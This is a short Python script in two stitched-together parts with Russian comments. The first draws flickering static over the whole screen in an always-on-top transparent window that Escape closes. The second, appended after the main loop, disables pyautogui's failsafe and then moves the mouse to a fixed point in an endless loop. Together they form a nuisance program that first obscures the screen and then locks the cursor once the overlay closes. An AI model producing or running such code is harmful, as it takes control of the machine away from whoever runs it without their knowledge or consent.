import tkinter as tk
import random

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.attributes('-transparentcolor', 'white') # Белый цвет станет прозрачным
root.config(bg='white')

canvas = tk.Canvas(root, bg='white', highlightthickness=0)
canvas.pack(fill='both', expand=True)

def draw_static():
    canvas.delete("all")
    # Рисуем 500 случайных линий/точек для эффекта помех
    for _ in range(500):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        color = random.choice(['black', 'gray', 'red'])
        canvas.create_line(x, y, x + 2, y, fill=color)
    
    root.after(50, draw_static) # Обновление каждые 50мс

draw_static()
root.bind('<Escape>', lambda e: root.destroy())
root.mainloop()
import pyautogui
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
while True: 
    pyautogui.moveTo(100, 100)

